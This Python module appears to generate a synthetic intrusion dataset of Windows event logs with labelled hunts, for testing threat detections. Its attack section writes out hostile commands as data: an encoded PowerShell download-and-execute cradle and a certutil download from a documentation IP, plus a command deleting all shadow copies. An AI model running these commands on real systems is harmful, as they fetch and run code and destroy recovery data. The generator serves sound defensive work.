"""Synthetic intrusion dataset with ground truth. All values are fake (documentation IP ranges)."""
import base64
import csv
import random
from datetime import datetime, timedelta

FIELDS = ["time", "host", "user", "event_id", "image", "parent_image", "command_line", "target", "source_ip", "pid", "ppid"]
SYS = "C:\\Windows\\System32\\"
PS = SYS + "WindowsPowerShell\\v1.0\\powershell.exe"
WORD = "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"
EXPECTED_HUNTS = {
    "office-spawns-shell", "encoded-powershell", "c2-port", "run-key-persistence", "lsass-access", "kerberoasting",
    "brute-force", "new-local-account", "beaconing", "dga-dns", "lateral-logons", "rare-parent-child", "shadow-copy-delete",
}


def _b64ps(cmd):
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


class Gen:
    def __init__(self, seed=11, start=datetime(2026, 3, 1, 9, 0, 0)):
        self.r = random.Random(seed)
        self.t = start
        self.rows = []
        self.pid = 1000

    def next_pid(self):
        self.pid += self.r.randint(4, 40)
        return self.pid

    def add(self, host, user, eid, gap=(1, 30), **kw):
        self.t += timedelta(seconds=self.r.randint(*gap))
        row = dict.fromkeys(FIELDS, "")
        row.update({"time": self.t.isoformat(), "host": host, "user": user, "event_id": eid})
        row.update(kw)
        self.rows.append(row)
        return row

    def at(self, t):
        self.t = t

    def proc(self, host, user, image, parent_image, cmd, ppid, gap=(1, 30)):
        pid = self.next_pid()
        self.add(host, user, 1, gap, image=image, parent_image=parent_image, command_line=cmd, pid=pid, ppid=ppid)
        return pid

    def baseline(self, n=120):
        for _ in range(n):
            host = self.r.choice(["WS01", "WS02", "SRV01"])
            user = self.r.choice(["alice", "bob", "carol"])
            k = self.r.random()
            if k < 0.4:
                self.proc(host, user, "C:\\Windows\\explorer.exe", SYS + "userinit.exe", "explorer.exe", 4)
            elif k < 0.55:
                self.proc(host, user, SYS + "svchost.exe", SYS + "services.exe", "svchost.exe -k netsvcs", 620)
            elif k < 0.7:
                self.proc(host, user, SYS + "ipconfig.exe", SYS + "cmd.exe", "ipconfig /all", 900)
            elif k < 0.85:
                self.add(host, user, 3, image="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                         target="142.250.%d.%d:443" % (self.r.randint(0, 255), self.r.randint(1, 254)), pid=self.next_pid())
            elif k < 0.95:
                self.add(host, user, 22, image="C:\\Windows\\explorer.exe", target=self.r.choice(["www.example.com", "mail.example.org", "docs.example.net"]))
            else:
                self.add("DC01", user, 4624, target="3", source_ip="10.0.0.%d" % self.r.randint(10, 20))
        # near-miss benign: monitoring agent polling every 60s with heavy jitter (must not look like a beacon)
        for _ in range(10):
            self.add("SRV01", "svc_mon", 3, gap=(5, 240), image="C:\\Monitoring\\agent.exe", target="10.0.0.9:8443", pid=77)
        # AV scanning LSASS is legitimate
        self.add("WS01", "SYSTEM", 10, image="C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe", target=SYS + "lsass.exe")

    def attack(self):
        h, u = "WS01", "alice"
        ex = self.proc(h, u, "C:\\Windows\\explorer.exe", SYS + "userinit.exe", "explorer.exe", 4)
        word = self.proc(h, u, WORD, "C:\\Windows\\explorer.exe", "WINWORD.EXE invoice.docm", ex)
        payload = _b64ps("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/stage2.ps1')")
        psp = self.proc(h, u, PS, WORD, "powershell.exe -nop -w hidden -enc " + payload, word)
        start = self.t
        # beacon every 60s +-3s
        t = self.t
        for _ in range(20):
            t += timedelta(seconds=60 + self.r.randint(-3, 3))
            self.at(t)
            self.add(h, u, 3, gap=(0, 0), image=PS, target="203.0.113.50:4444", pid=psp)
        self.at(start + timedelta(seconds=30))
        self.add(h, u, 13, image="C:\\Users\\alice\\AppData\\Local\\Temp\\upd.exe",
                 target="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", pid=self.next_pid())
        cmd = self.proc(h, u, SYS + "cmd.exe", PS, "cmd.exe /c whoami /all", psp)
        self.proc(h, u, SYS + "certutil.exe", SYS + "cmd.exe", "certutil -urlcache -f http://203.0.113.50/m.exe C:\\Users\\Public\\m.exe", cmd)
        self.proc(h, u, "C:\\Users\\Public\\tool.exe", SYS + "wbem\\wmiprvse.exe", "tool.exe", cmd)
        self.add(h, u, 10, image="C:\\Users\\Public\\m.exe", target=SYS + "lsass.exe", pid=self.next_pid())
        for i in range(4):
            self.add("DC01", u, 4769, gap=(2, 8), target="svc_sql%d 0x17" % i, source_ip="10.0.0.21")
        for i in range(6):
            self.add("DC01", "admin", 4625, gap=(2, 9), target="3", source_ip="10.0.0.99")
        self.add("DC01", "admin", 4624, target="3", source_ip="10.0.0.99")
        for host in ("SRV01", "SRV02", "SRV03", "FILE01", "DC01"):
            self.add(host, "alice", 4624, gap=(10, 40), target="3", source_ip="10.0.0.21")
        self.add("DC01", "alice", 4720, target="backup$")
        for i in range(5):
            label = "".join(self.r.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(18))
            self.add(h, u, 22, gap=(3, 12), image=PS, target=label + ".top")
        self.proc("FILE01", "alice", SYS + "vssadmin.exe", SYS + "cmd.exe", "vssadmin delete shadows /all /quiet", 900)

    def build(self, noise=120):
        self.baseline(noise)
        self.attack()
        self.baseline(noise // 2)
        return sorted(self.rows, key=lambda r: r["time"])


def generate(seed=11, noise=120):
    return Gen(seed).build(noise)


def write_csv(path, rows):
    with open(path, "w", encoding="utf-8", newline="") as fh:
        w = csv.DictWriter(fh, fieldnames=FIELDS)
        w.writeheader()
        w.writerows(rows)
